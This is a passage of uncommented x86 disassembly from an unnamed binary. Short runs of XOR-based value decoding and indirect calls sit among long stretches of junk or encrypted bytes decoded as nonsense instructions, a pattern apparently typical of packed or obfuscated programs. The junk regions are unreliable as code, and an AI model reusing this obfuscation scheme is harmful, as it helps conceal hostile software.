  404361:	mov    cl,BYTE PTR [eax]
  404363:	data16 sub al,0x72
  404366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404367:	(bad)  
  404369:	and    DWORD PTR [ebx+0x437250fd],ecx
  40436f:	ror    ch,cl
  404371:	rcl    DWORD PTR [edx-0x7cd93405],0x19
  404378:	fcmove st,st(3)
  40437a:	js     0x404338
  40437c:	(bad)  
  40437d:	test   eax,0x8e8ddc90
  404382:	push   0x8afac76b
  404387:	imul   ecx,eax,0x1e6748ed
  40438d:	hlt    
  40438e:	sahf   
  40438f:	outs   dx,BYTE PTR ds:[esi]
  404390:	in     al,0xc1
  404392:	jbe    0x4043bf
  404394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404395:	jns    0x404331
  404397:	retf   
  404398:	in     eax,dx
  404399:	(bad)  
  40439d:	dec    ebx
  40439e:	(bad)  
  4043a0:	aaa    
  4043a1:	inc    eax
  4043a2:	cmc    
  4043a3:	jl     0x40439c
  4043a5:	and    ch,BYTE PTR [esi-0x7e05a1db]
  4043ab:	sub    dl,ch
  4043ad:	stos   BYTE PTR es:[edi],al
  4043ae:	cld    
  4043af:	out    0x6a,eax
  4043b1:	push   cs
  4043b2:	dec    edx
  4043b3:	cdq    
  4043b4:	out    0xa,eax
  4043b6:	adc    esp,DWORD PTR [edx+0x37]
  4043b9:	fld    TBYTE PTR [eax*2-0x5c2b0399]
  4043c0:	popf   
  4043c1:	sub    al,0xcd
  4043c3:	mov    esp,0x4a34693b
  4043c8:	test   BYTE PTR [ecx+0x4204a63e],al
  4043ce:	gs fcmovb st,st(0)
  4043d1:	sbb    DWORD PTR [esi],edi
  4043d3:	xchg   DWORD PTR [edx-0x31],esp
  4043d6:	mov    eax,0xa068528c
  4043db:	hlt    
  4043dc:	or     DWORD PTR [edi],0xffffff85
  4043df:	mov    edx,0x5ffffffd
  4043e4:	pop    ebx
  4043e5:	mov    eax,DWORD PTR [ebp-0x8]
  4043e8:	mov    edx,DWORD PTR [ebp+0x10]
  4043eb:	xor    eax,ecx
  4043ed:	add    eax,esi
  4043ef:	mov    DWORD PTR [edx],eax
  4043f1:	mov    eax,DWORD PTR [ebp-0x8]
  4043f4:	xor    eax,ecx
  4043f6:	add    eax,esi
  4043f8:	mov    DWORD PTR [ebp+0x8],eax
  4043fb:	mov    eax,DWORD PTR [ebp+0x8]
  4043fe:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404402:	mov    dl,BYTE PTR [ebp-0x1]
  404405:	cmp    al,dl
  404407:	je     0x40444a
  40440d:	mov    eax,DWORD PTR [ebp+0x8]
  404410:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404414:	mov    edx,DWORD PTR [ebp+0xc]
  404417:	cmp    al,BYTE PTR [edx]
  404419:	jne    0x40467a
  40441f:	mov    eax,DWORD PTR [ebp-0x8]
  404422:	mov    edx,DWORD PTR [ebp+0xc]
  404425:	movsx  edx,BYTE PTR [edx]
  404428:	xor    eax,ecx
  40442a:	add    eax,esi
  40442c:	cmp    edx,eax
  40442e:	je     0x404464
  404434:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40443b:	lea    eax,[ebp-0x18]
  40443e:	mov    DWORD PTR [ebp-0x14],eax
  404441:	mov    eax,DWORD PTR [ebp-0x14]
  404444:	add    DWORD PTR [eax],0x705fa8f
  40444a:	mov    eax,DWORD PTR [ebp-0x10]
  40444d:	mov    edx,DWORD PTR [ebp+0x8]
  404450:	xor    eax,ecx
  404452:	lea    eax,[eax+edx*1+0x32729e]
  404459:	mov    DWORD PTR [ebp+0x8],eax
  40445c:	inc    DWORD PTR [ebp+0xc]
  40445f:	jmp    0x4043fb
  404464:	mov    eax,DWORD PTR [ebp-0x10]
  404467:	jmp    0x40456c
  40446c:	sbb    esi,DWORD PTR [edi+0x22]
  40446f:	sbb    BYTE PTR [edx],ah
  404471:	cmp    eax,0x7b87773d
  404476:	les    ecx,FWORD PTR ds:0x5062981e
  40447c:	mov    dh,0x1c
  40447e:	jl     0x4044fc
  404480:	push   esp
  404481:	jl     0x4044ff
  404483:	jl     0x404477
  404485:	jne    0x404436
  404487:	xor    eax,0xf13826b5
  40448c:	test   DWORD PTR [ecx*4+0x585c27d3],esi
  404493:	mov    esp,0x2c74939b
  404498:	and    cl,BYTE PTR [ebx]
  40449a:	sub    edi,ecx
  40449c:	sti    
  40449d:	jge    0x404465
  40449f:	stc    
  4044a0:	fld    QWORD PTR [ecx+0x63]
  4044a3:	pop    edx
  4044a4:	fsubr  DWORD PTR [edx]
  4044a6:	sub    eax,DWORD PTR [edx-0x1b]
  4044a9:	add    DWORD PTR [ecx+0x13802536],0xfffffff1
  4044b0:	retf   
  4044b1:	jmp    0x4044f0
  4044b3:	in     eax,0xea
  4044b5:	inc    esp
  4044b6:	adc    eax,0x60d3fa34
  4044bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044bc:	adc    BYTE PTR [ebx],dl
  4044be:	add    dh,BYTE PTR [edi+0x72]
  4044c1:	ja     0x404482
  4044c3:	xchg   ebx,eax
  4044c4:	or     edx,DWORD PTR [edi+ecx*4-0x35]
  4044c8:	mul    ecx
  4044ca:	call   0xa8f6a5d4
  4044cf:	cmp    ecx,ebx
  4044d1:	mov    eax,0x2e2af134
  4044d6:	push   0xffffffe6
  4044d8:	gs mov ch,0xf2
  4044db:	jns    0x4044c9
  4044dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044de:	repz es ss loopne 0x404505
  4044e3:	frstor [ebp+esi*2-0x67]
  4044e7:	popa   
  4044e8:	enter  0x1d68,0xdf
  4044ec:	pop    ds
  4044ed:	(bad)  
  4044ee:	mov    bl,0x1e
  4044f0:	sub    ah,BYTE PTR [edx+0x58]
  4044f3:	adc    al,0x9a
  4044f5:	mov    al,0xc2
  4044f7:	ja     0x404510
  4044f9:	imul   ebp,DWORD PTR [esi],0xfffffffc
  4044fc:	adc    al,0xc
  4044fe:	outs   dx,DWORD PTR ds:[esi]
  4044ff:	cmp    edx,DWORD PTR [eax+edx*2-0x48]
  404503:	mov    ecx,0xc4eaeb40
  404508:	arpl   WORD PTR [edi],bx
  40450a:	jl     0x404547
  40450c:	ss mov ebp,0x208426d3
  404512:	das    
  404513:	adc    DWORD PTR [ebp-0x34],ebp
  404516:	mov    edi,es
  404518:	xchg   ecx,eax
  404519:	cmc    
  40451a:	(bad)  
  40451b:	dec    eax
  40451c:	push   es
  40451d:	mov    DWORD PTR [ebx-0x34e9199d],esp
  404523:	cmc    
  404524:	fwait
  404525:	pusha  
  404526:	sub    al,0xf
  404528:	mov    esi,0x3abb6a70
  40452d:	pop    ecx
  40452e:	loope  0x404521
  404530:	pop    ss
  404531:	(bad)  
  404532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404533:	pop    ebx
  404534:	dec    eax
  404535:	jp     0x40458a
  404537:	xor    al,0x83
  404539:	call   0x46c2e551
  40453e:	add    esp,DWORD PTR ss:[eax+0x1b]
  404542:	lods   al,BYTE PTR ds:[esi]
  404543:	sbb    DWORD PTR [eax-0x6e4a0ab9],edx
  404549:	ja     0x404531
  40454b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40454c:	mov    dl,BYTE PTR [edx+eiz*1-0xa]
  404550:	jecxz  0x404511
  404552:	dec    ebx
  404553:	sub    dl,BYTE PTR [ebp+0x59]
  404556:	or     al,0xac
  404558:	std    
  404559:	(bad)  
  40455a:	cmp    edi,DWORD PTR [edx+0x5d7898e]
  404560:	sub    bl,BYTE PTR [esi+0x6b]
  404563:	sbb    dl,BYTE PTR [ebx+0x3b]
  404566:	lea    eax,[esi]
  404568:	popf   
  404569:	(bad)  
  40456a:	fdivr  QWORD PTR [esi+0x33]
  40456d:	ror    DWORD PTR [ebx+0xe9104d],0x1
  404574:	add    BYTE PTR [eax],al
  404576:	imul   eax,DWORD PTR ds:0x7d79fdb1,0x7b
  40457d:	test   DWORD PTR [esi],esp
  40457f:	xchg   ecx,eax
  404580:	retf   
  404581:	(bad)  [eax-0x516f2044]
  404587:	pop    ds
  404588:	jl     0x404606
  40458a:	push   esp
  40458b:	jl     0x404609
  40458d:	jl     0x404549
  40458f:	mov    edi,0x15575209
  404594:	xchg   ecx,eax
  404595:	mov    bl,0x9f
  404597:	test   al,0xb8
  404599:	addr16 jo 0x40461a
  40459c:	adc    ecx,DWORD PTR [ecx+0x7d0f4739]
  4045a2:	jecxz  0x4045a8
  4045a4:	jmp    0x4045a9
  4045a6:	xchg   ebx,eax
  4045a7:	mov    bh,0x32
  4045a9:	xor    BYTE PTR [edx+0x2a83dfe8],0x24
  4045b0:	dec    esp
  4045b1:	pop    eax
  4045b2:	push   esp
  4045b3:	add    al,0x9a
  4045b5:	and    esp,DWORD PTR [eax]
  4045b7:	mov    ah,BYTE PTR [edx+edi*8+0x712c8438]
  4045be:	jmp    0xb9fdf43b
  4045c3:	xchg   DWORD PTR [edi],edi
  4045c5:	fst    QWORD PTR [eax-0x575e7eca]
  4045cb:	xchg   edx,eax
  4045cc:	inc    edi
  4045cd:	nop
  4045ce:	shl    BYTE PTR [eax],0x13
  4045d1:	or     eax,0x82a64394
  4045d6:	(bad)  
  4045d7:	xor    DWORD PTR [edx-0x5ff2c2e2],ebp
  4045dd:	ss lock and al,0xfa
  4045e1:	mov    DWORD PTR [ebx],ecx
  4045e3:	mov    ah,BYTE PTR [edi-0x2921b73e]
  4045e9:	hlt    
  4045ea:	and    al,0x89
  4045ec:	jns    0x40460f
  4045ee:	call   0xd64b:0x71ba19c6
  4045f5:	popf   
  4045f6:	shr    BYTE PTR [ebx-0x65],cl
  4045f9:	out    0x1d,eax
  4045fb:	gs cli 
  4045fd:	mov    fs,esp
  4045ff:	das    
  404600:	div    al
  404602:	arpl   WORD PTR [bx+si],dx
  404605:	jb     0x4045e4
  404607:	add    BYTE PTR [esi-0x1b],0x52
  40460b:	mov    cl,0xc6
  40460d:	cs sub edx,esp
  404610:	into   
  404611:	call   0x278d:0x9974c1e8
  404618:	into   
  404619:	inc    esi
  40461a:	push   ds
  40461b:	ins    BYTE PTR es:[edi],dx
  40461c:	stos   BYTE PTR es:[edi],al
  40461d:	in     eax,dx
  40461e:	int    0xdc
  404620:	xlat   BYTE PTR ds:[ebx]
  404621:	fs push 0x91db2962
  404627:	mov    ch,0x23
  404629:	and    eax,DWORD PTR [ecx]
  40462b:	stos   BYTE PTR es:[edi],al
  40462c:	xor    eax,0x2eae7785
  404631:	push   esp
  404632:	test   DWORD PTR [esp+esi*4+0xf],edi
  404636:	push   ds
  404637:	dec    ebp
  404638:	rcl    BYTE PTR [edi-0x27],0x63
  40463c:	icebp  
  40463d:	(bad)  
  40463e:	test   al,0x63
  404640:	fcomp  DWORD PTR [edi+0x3baac52c]
  404646:	mov    al,ds:0x1c88e83e
  40464b:	fwait
  40464c:	scas   al,BYTE PTR es:[edi]
  40464d:	punpcklbw mm2,DWORD PTR [esi]
  404650:	jmp    0xf060943e
  404655:	xor    BYTE PTR [esp+edx*1-0x61],0xd4
  40465a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40465b:	call   0xc890:0x229531f6
  404662:	adc    BYTE PTR [ebx],dh
  404664:	iret   
  404665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404666:	mov    esp,0xe9c5ed7a
  40466b:	cdq    
  40466c:	dec    edx
  40466d:	mov    edi,0x6319e366
  404672:	sub    al,0xa8
  404674:	and    BYTE PTR [edi],dl
  404676:	add    eax,esi
  404678:	mov    DWORD PTR [ecx],eax
  40467a:	pop    esi
  40467b:	leave  
  40467c:	ret    0xc
  40467f:	push   ebp
  404680:	mov    ebp,esp
  404682:	push   ecx
  404683:	adc    edx,0x1579
  404689:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  404690:	sbb    DWORD PTR ds:0x4292a5,0xe46
  40469a:	mov    eax,DWORD PTR [ebp-0x4]
  40469d:	xor    edx,edx
  40469f:	add    edx,DWORD PTR ds:0x42c8ba
  4046a5:	xor    ecx,ecx
  4046a7:	add    ecx,DWORD PTR ds:0x42c8ce
  4046ad:	sub    edx,ecx
  4046af:	xor    edx,DWORD PTR [edx+ecx*1]
  4046b2:	mov    edx,DWORD PTR [ebp+0x10]
  4046b5:	xor    DWORD PTR ds:0x427cf7,0x3e4e
  4046bf:	mov    ecx,0x7510857
  4046c4:	sbb    DWORD PTR ds:0x427cff,0x4292c5
  4046ce:	xor    eax,ecx
  4046d0:	add    DWORD PTR ds:0x4275ac,0x4292c1
  4046da:	add    eax,0x32729e
  4046df:	mov    DWORD PTR [edx],eax
  4046e1:	adc    DWORD PTR ds:0x427cff,0xab1
  4046eb:	mov    eax,DWORD PTR [ebp+0xc]
  4046ee:	mov    DWORD PTR ds:0x4292c5,0x1c
  4046f8:	cmp    DWORD PTR ds:0x4292c5,0x0
  4046ff:	je     0x4048d6
  404705:	cmp    DWORD PTR ds:0x4292c5,0xd
  40470c:	jne    0x404718
  404712:	call   DWORD PTR ds:0x4279d3
  404718:	cmp    DWORD PTR ds:0x4292c5,0xe
  40471f:	jne    0x404734
  404725:	xor    edx,edx
  404727:	xor    edx,DWORD PTR ds:0x4292c5
  40472d:	dec    edx
  40472e:	mov    DWORD PTR ds:0x4292c5,edx
  404734:	xor    edx,edx
  404736:	xor    edx,DWORD PTR ds:0x4292c5
  40473c:	dec    edx
  40473d:	mov    DWORD PTR ds:0x4292c5,edx
  404743:	jmp    0x4046f8
  404748:	and    DWORD PTR ds:0x427cf7,0x0
  404752:	jmp    0x404766
  404757:	xor    edx,edx
  404759:	or     edx,DWORD PTR ds:0x427cf7
  40475f:	inc    edx
  404760:	mov    DWORD PTR ds:0x427cf7,edx
  404766:	cmp    DWORD PTR ds:0x427cf7,0x1c
  40476d:	jae    0x4048d6
  404773:	cmp    DWORD PTR ds:0x427cf7,0x21
  40477a:	jne    0x404791
  404780:	push   DWORD PTR [ebp-0xc]
  404783:	push   DWORD PTR [ebp-0x28]
  404786:	push   0x3a03
  40478b:	call   DWORD PTR ds:0x4278f3
  404791:	jmp    0x404757
  404796:	jmp    0x4048d6
  40479b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40479c:	mov    eax,0x5df986f9
  4047a1:	gs mov ebx,0x53054722
  4047a7:	or     dh,BYTE PTR [ecx-0x24]
  4047aa:	in     al,0x86
  4047ac:	push   ds
  4047ad:	jl     0x40482b
  4047af:	adc    DWORD PTR [edi+0x7c],edi
  4047b2:	jl     0x404784
  4047b4:	or     al,0x17
  4047b6:	test   eax,0x75c67412
  4047bb:	or     DWORD PTR [edi],0x4f1c20c5
  4047c1:	scas   al,BYTE PTR es:[edi]
  4047c2:	push   eax
  4047c3:	pop    ebx
  4047c4:	sbb    BYTE PTR [esi],bh
  4047c6:	sti    
  4047c7:	cmc    
  4047c8:	shr    DWORD PTR [ebx],0xaf
  4047cb:	xchg   esi,eax
  4047cc:	pop    es
  4047cd:	shl    BYTE PTR [eax+0x6bf073ee],cl
  4047d3:	sub    eax,0xd545552a
  4047d8:	dec    esi
  4047d9:	sbb    eax,0x6da31910
  4047de:	and    esp,0x10
  4047e1:	push   eax
  4047e2:	push   edx
  4047e3:	pop    ecx
  4047e4:	fwait
  4047e5:	(bad)  
  4047e6:	cld    
  4047e7:	scas   eax,DWORD PTR es:[edi]
  4047e8:	mov    ds:0xc27a9c71,eax
  4047ed:	sbb    cl,bh
  4047ef:	in     eax,0x9b
  4047f1:	and    edx,DWORD PTR [ebp-0x2]
  4047f4:	stos   BYTE PTR es:[edi],al
  4047f5:	adc    al,0xb2
  4047f7:	mov    bh,0xf8
  4047f9:	cwde   
  4047fa:	shl    DWORD PTR [edx-0x7019bf99],1
  404800:	jge    0x404804
  404802:	pop    ecx
  404803:	fist   DWORD PTR [eax-0x2c]
  404806:	add    BYTE PTR ss:[edi-0x7abc8ee7],bh
  40480d:	cmp    DWORD PTR [esi+0x0],0xffffff85
  404811:	fnsave [edx]
  404813:	dec    ebx
  404814:	or     bh,BYTE PTR [edx-0x3a78389c]
  40481a:	loop   0x404857
  40481c:	loopne 0x4047ae
  40481e:	xor    DWORD PTR [edi+0x871135c],eax
  404824:	lahf   
  404825:	repnz push ss
  404827:	jmp    0x404830
  404829:	xchg   BYTE PTR [ebx-0x35],dl
  40482c:	fld    QWORD PTR [ecx-0x50e43ac3]
  404832:	cmp    al,0x41
  404834:	sbb    BYTE PTR [edx+0x25],cl
  404837:	iret   
  404838:	stc    
  404839:	sub    eax,0xd22c6b93
  40483e:	fadd   DWORD PTR [eax+0x30]
  404841:	pop    ebp
  404842:	inc    edx
  404843:	jnp    0x404897
  404845:	popf   
  404846:	stos   BYTE PTR es:[edi],al
  404847:	stc    
  404848:	push   cs
  404849:	add    eax,0x96f59f04
  40484e:	fisub  WORD PTR [ebp+0x392a5540]
  404854:	inc    ecx
  404855:	aaa    
  404856:	mov    ah,BYTE PTR [esi]
  404858:	(bad)  
  404859:	jmp    0xada23e06
  40485e:	mov    al,ds:0xbe9c052c
  404863:	jb     0x404809
  404865:	push   esi
  404866:	and    ah,BYTE PTR [ebx-0x37]
  404869:	xchg   esi,eax
  40486a:	dec    ebp
  40486b:	xor    al,0x1f
  40486d:	fsub   QWORD PTR [edx-0x68d98dc7]
  404873:	daa    
  404874:	or     al,dl
  404876:	iret   
  404877:	sub    DWORD PTR [edi],ecx
  404879:	ins    BYTE PTR es:[edi],dx
  40487a:	addr16 data16 or dh,cl
  40487e:	xchg   edi,eax
  40487f:	sbb    bh,BYTE PTR [eax]
  404881:	rcr    DWORD PTR [ebp+0x17],1
  404884:	and    al,0x15
  404886:	repnz inc ebx
  404888:	and    BYTE PTR [ebp+0x3b],bh
  40488b:	enter  0x7188,0xd4
  40488f:	loop   0x404832
  404891:	std    
  404892:	retf   
  404893:	aas    
  404894:	xor    eax,0x206def51
  404899:	jmp    0xaa5225f0
  40489e:	rcr    BYTE PTR [ebp+0x54],0xbb
  4048a2:	loope  0x404916
  4048a4:	jmp    0xc3945123
  4048a9:	shl    edi,cl
  4048ab:	rcr    ebp,0x59
  4048ae:	rcl    BYTE PTR es:[esi-0x45ee5ef0],cl
  4048b5:	jg     0x4048c3
  4048b7:	int3   
  4048b8:	int    0xd1
  4048ba:	mov    eax,ds:0x194eaba9
  4048bf:	outs   dx,DWORD PTR ds:[esi]
  4048c0:	call   0xef13:0xf508cafc
  4048c7:	fstp   QWORD PTR [ebp+ebx*2+0x74118bc9]
  4048ce:	mov    bl,0x10
  4048d0:	iret   
  4048d1:	test   al,0x5f
  4048d3:	xlat   BYTE PTR ds:[ebx]
  4048d4:	dec    edx
  4048d5:	and    dh,BYTE PTR [ebx]
  4048d7:	rcl    DWORD PTR [esi-0x75],0x75
  4048db:	adc    BYTE PTR [edx+0x32729e],bh
  4048e1:	add    eax,edx
  4048e3:	mov    DWORD PTR [esi+0x4],eax
  4048e6:	mov    eax,DWORD PTR [ebp+0x14]
  4048e9:	mov    esi,DWORD PTR [ebp+0x10]
  4048ec:	mov    DWORD PTR [esi+0x8],eax
  4048ef:	mov    eax,DWORD PTR [ebp+0x18]
  4048f2:	mov    esi,DWORD PTR [ebp+0x10]
  4048f5:	mov    DWORD PTR [esi+0xc],eax
  4048f8:	mov    eax,DWORD PTR [ebp+0x1c]
  4048fb:	mov    esi,DWORD PTR [ebp+0x10]
  4048fe:	jmp    0x404a3e
  404903:	shl    DWORD PTR [ebx+0x7],0xc
  404907:	mov    ebp,0x4065d978
  40490c:	mov    eax,ds:0x1713e8b5
  404911:	push   DWORD PTR [ebp-0x45]
  404914:	adc    DWORD PTR [esp+edi*2+0x11],edi
  404918:	jg     0x404996
  40491a:	jl     0x404985
  40491c:	stos   DWORD PTR es:[edi],eax
  40491d:	and    bl,BYTE PTR [ecx]
  40491f:	dec    ecx
  404920:	fs (bad) 
  404922:	in     al,dx
  404923:	and    DWORD PTR [esi+0x6f0450ca],ebp
  404929:	add    al,0x77
  40492b:	inc    edi
  40492c:	shl    BYTE PTR [ebx-0x44de3bb],0xf5
  404933:	icebp  
  404934:	imul   edi,DWORD PTR [esi],0xffffffda
  404937:	stos   BYTE PTR es:[edi],al
  404938:	adc    bl,BYTE PTR [esi+0x5843f665]
  40493e:	ds sahf 
  404940:	test   al,0x98
  404942:	in     eax,0xb1
  404944:	mov    dh,0xdf
  404946:	mov    edi,0xc747f2a
  40494b:	rcl    BYTE PTR [esp+eax*8+0x35],0xb4
  404950:	and    al,0x56
  404952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404954:	repz push ds
  404956:	fsubp  st(5),st
  404958:	mov    cl,BYTE PTR [eax]
  40495a:	and    edi,edi
  40495c:	(bad)  
  40495d:	lods   al,BYTE PTR ds:[esi]
  40495e:	jmp    0xdedc:0x208819b5
  404965:	cmp    BYTE PTR [ecx+0x70],ah
  404968:	xor    eax,0xbd804c26
  40496d:	xchg   edi,eax
  40496e:	daa    
  40496f:	in     al,0x9
  404971:	stos   DWORD PTR es:[edi],eax
  404972:	daa    
  404973:	gs push eax
  404975:	(bad)  
  404976:	mov    ds:0x1c2255f0,al
  40497b:	xchg   esi,eax
  40497c:	dec    ebp
  40497d:	repz out dx,eax
  40497f:	fiadd  WORD PTR [ebp-0x456db1ee]
  404985:	inc    ebx
  404986:	mov    ah,0x86
  404988:	stc    
  404989:	rcl    ch,0x7d
  40498c:	outs   dx,DWORD PTR ds:[esi]
  40498d:	rcr    ch,cl
  40498f:	inc    ecx
  404990:	lds    ecx,FWORD PTR [ebx-0x56]
  404993:	jecxz  0x404949
  404995:	fisub  DWORD PTR [edi+0x2a]
  404998:	push   esi
  404999:	or     dh,ah
  40499b:	out    0x30,al
  40499d:	adc    eax,0x7f4ca4b
  4049a2:	xchg   edx,eax
  4049a3:	or     DWORD PTR [edx+0xfc811c0],0xadad3419
  4049ad:	and    al,BYTE PTR [edi+0x30]
  4049b0:	sub    ch,BYTE PTR [esi]
  4049b2:	jae    0x4049fd
  4049b4:	ret    0x2b61
  4049b7:	sbb    al,0x15
  4049b9:	sti    
  4049ba:	aaa    
  4049bb:	push   es
  4049bc:	aad    0xe5
  4049be:	pop    ebx
  4049bf:	aaa    
  4049c0:	lahf   
  4049c1:	idiv   BYTE PTR [ecx]
  4049c3:	jb     0x404a0d
  4049c5:	in     eax,0xe3
  4049c7:	pop    eax
  4049c8:	jecxz  0x4049c7
  4049ca:	ret    0x81da
  4049cd:	ss dec eax
  4049cf:	(bad)  
  4049d0:	into   
  4049d1:	pop    ecx
  4049d2:	dec    eax
  4049d3:	jnp    0x404a0a
  4049d5:	je     0x4049fb
  4049d7:	jmp    0xb177:0xf5306094
  4049de:	daa    
  4049df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049e0:	mov    WORD PTR [esi+0x59],cs
  4049e3:	sbb    edi,eax
  4049e5:	push   ebp
  4049e6:	pop    esp
  4049e7:	push   es
  4049e8:	adc    edx,DWORD PTR [ebp+0x4b]
  4049eb:	mov    ds:0xd2116496,al
  4049f0:	jbe    0x4049e9
  4049f2:	xchg   ebx,eax
  4049f3:	mov    edx,0x6f489bf
  4049f8:	ss dec edx
  4049fa:	pop    ss
  4049fb:	or     DWORD PTR [ebp+0x795b9806],0x3435fd4b
  404a05:	retf   
  404a06:	sbb    ebp,DWORD PTR [edi+0x41]
  404a09:	adc    bl,BYTE PTR [esi]
  404a0b:	jp     0x404a51
  404a0d:	cli    
  404a0e:	nop
  404a0f:	jl     0x4049e0
  404a11:	call   0x3c29c3dc
  404a16:	sub    DWORD PTR [ebp+0x5a],eax
  404a19:	adc    DWORD PTR [ecx-0x1a],ecx
  404a1c:	sub    DWORD PTR [edx],ecx
  404a1e:	call   0x4c:0xac14b40a
  404a25:	push   ebp
  404a26:	pop    es
  404a27:	arpl   di,sp
  404a29:	ds xchg edi,eax
  404a2b:	out    0xcd,eax
  404a2d:	jmp    0xf3b4:0xc9951f13
  404a34:	cmp    edx,0x27eafb7d
  404a3a:	ror    BYTE PTR [ebx+0x46896456],0x10
  404a41:	mov    eax,eax
  404a43:	mov    eax,DWORD PTR [ebp+0x8]
  404a46:	xor    eax,ecx
  404a48:	add    eax,edx
  404a4a:	pop    esi
  404a4b:	leave  
  404a4c:	ret    0x18
  404a4f:	push   ebp
  404a50:	mov    ebp,esp
  404a52:	mov    eax,DWORD PTR [ebp+0xc]
  404a55:	xor    edx,edx
  404a57:	mov    ecx,0x7264fcad
  404a5c:	div    ecx
  404a5e:	jmp    0x404b9e
  404a63:	outs   dx,BYTE PTR ds:[esi]
  404a64:	stc    
  404a65:	sti    
  404a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a67:	jnp    0x404a23
  404a69:	gs stc 
  404a6b:	dec    esi
  404a6c:	xchg   DWORD PTR [ebx-0x278436f3],esp
  404a72:	jbe    0x404ad0
  404a74:	adc    BYTE PTR [esp+edi*2+0x11],bh
  404a78:	jg     0x404af6
  404a7a:	jl     0x404a3a
  404a7c:	test   BYTE PTR [edx],dl
  404a7e:	or     al,0x94
  404a80:	pop    eax
  404a81:	mov    WORD PTR [eax],ss
  404a83:	mov    ebx,DWORD PTR [eax+0x13]
  404a86:	dec    edx
  404a87:	push   esi
  404a88:	inc    eax
  404a89:	dec    BYTE PTR es:[edi+0x698b73bf]
  404a90:	add    DWORD PTR [edx],esi
  404a92:	sub    bl,BYTE PTR [ecx]
  404a94:	jmp    0xbd464117
  404a99:	mov    al,0x40
  404a9b:	(bad)  
  404a9c:	sti    
  404a9d:	repz sub BYTE PTR [ecx+0x14],ah
  404aa1:	fs in  eax,0x59
  404aa4:	mov    edx,0x3dce4fe
  404aa9:	sti    
  404aaa:	loope  0x404ae3
  404aac:	and    al,0x34
  404aae:	xor    cl,BYTE PTR [ecx-0x16]
  404ab1:	jmp    0xe87a28e4
  404ab6:	repnz inc eax
  404ab8:	fst    DWORD PTR [eax+0x4]
  404abb:	out    dx,eax
  404abc:	jbe    0x404ab3
  404abe:	test   al,0xe
  404ac0:	jle    0x404b27
  404ac2:	jg     0x404b20
  404ac4:	clc    
  404ac5:	dec    ecx
  404ac6:	sbb    ecx,DWORD PTR [ebx]
  404ac8:	sahf   
  404ac9:	arpl   WORD PTR [ecx],dx
  404acb:	in     eax,dx
  404acc:	dec    edx
  404acd:	pop    ebp
  404ace:	arpl   cx,bp
  404ad0:	bound  esp,QWORD PTR ds:0x2b3e593
  404ad6:	sbb    eax,0x7f27c7ce
  404adb:	in     al,dx
  404adc:	icebp  
  404add:	inc    ebp
  404ade:	cld    
  404adf:	imul   edi,DWORD PTR [ecx+0x4c],0xc18af7f7
  404ae6:	push   ebx
  404ae7:	cmp    eax,0x16fd6a17
  404aec:	aaa    
  404aed:	jg     0x404b43
  404aef:	and    bh,BYTE PTR cs:[edx]
  404af2:	aas    
  404af3:	add    al,0x16
  404af5:	stc    
  404af6:	xor    eax,0x556d69d8
  404afb:	mov    esp,0xed72154e
  404b00:	sbb    DWORD PTR [edx],0x18
  404b03:	and    eax,0xffffffdb
  404b06:	pushf  
  404b07:	cmp    esi,DWORD PTR [edx-0x11b574e8]
  404b0d:	dec    ebx
  404b0e:	xchg   ecx,eax
  404b0f:	xor    al,0x31
  404b11:	xchg   DWORD PTR [edx+0x57],esp
  404b14:	xor    ah,BYTE PTR [esi+0x7863ad74]
  404b1a:	retf   0x16b5
  404b1d:	mov    ?,WORD PTR [eax+0x31]
  404b20:	retf   
  404b21:	out    dx,eax
  404b22:	in     eax,0xd7
  404b24:	push   eax
  404b25:	push   edx
  404b26:	mov    ds:0x62fc07b1,al
  404b2b:	outs   dx,DWORD PTR ds:[esi]
  404b2c:	repnz dec esp
  404b2e:	inc    ebx
  404b2f:	inc    edx
  404b30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b31:	aad    0xf
  404b33:	push   es
  404b34:	add    al,0x8a
  404b36:	mov    ah,BYTE PTR [ecx+0x54]
  404b39:	mov    ch,0xc3
  404b3b:	mov    bl,0xb9
  404b3d:	out    0xac,eax
  404b3f:	imul   ebp,ebp,0x74
  404b42:	xchg   BYTE PTR [esi],dh
  404b44:	dec    edi
  404b45:	push   0x9dad01cc
  404b4a:	cmp    al,0xbb
  404b4c:	pop    esp
  404b4d:	sti    
  404b4e:	neg    DWORD PTR [ecx+0x52]
  404b51:	jae    0x404b36
  404b53:	add    esi,DWORD PTR [edx+0x3c]
  404b56:	fsubrp st(2),st
  404b58:	xchg   ecx,eax
  404b59:	fcomip st,st(6)
  404b5b:	jo     0x404afd
  404b5d:	xchg   esp,eax
  404b5e:	leave  
  404b5f:	xchg   edi,eax
  404b60:	add    al,0x19
  404b62:	and    ebp,DWORD PTR [ebx]
  404b64:	jecxz  0x404bd8
  404b66:	gs icebp 
  404b68:	cmp    eax,0x415e7e3b
  404b6d:	mov    dh,dh
  404b6f:	xchg   ebp,eax
  404b70:	fidiv  DWORD PTR [edi+edx*4]
  404b73:	mov    edx,0xb4beebaa
  404b78:	push   esi
  404b79:	sub    edx,DWORD PTR [ebx]
  404b7b:	inc    ecx
  404b7c:	inc    esi
  404b7d:	cmc    
  404b7e:	loopne 0x404b52
  404b80:	sub    ebx,esp
  404b82:	adc    al,0x21
  404b84:	inc    eax
  404b85:	into   
  404b86:	adc    cl,bl
  404b88:	jl     0x404bae
  404b8a:	and    DWORD PTR [ebx],ecx
  404b8c:	(bad)  [esi-0x71]
  404b8f:	inc    edx
  404b90:	adc    bh,BYTE PTR [eax-0x22bed2c0]
  404b96:	sbb    esi,DWORD PTR [edi-0x7c2b0755]
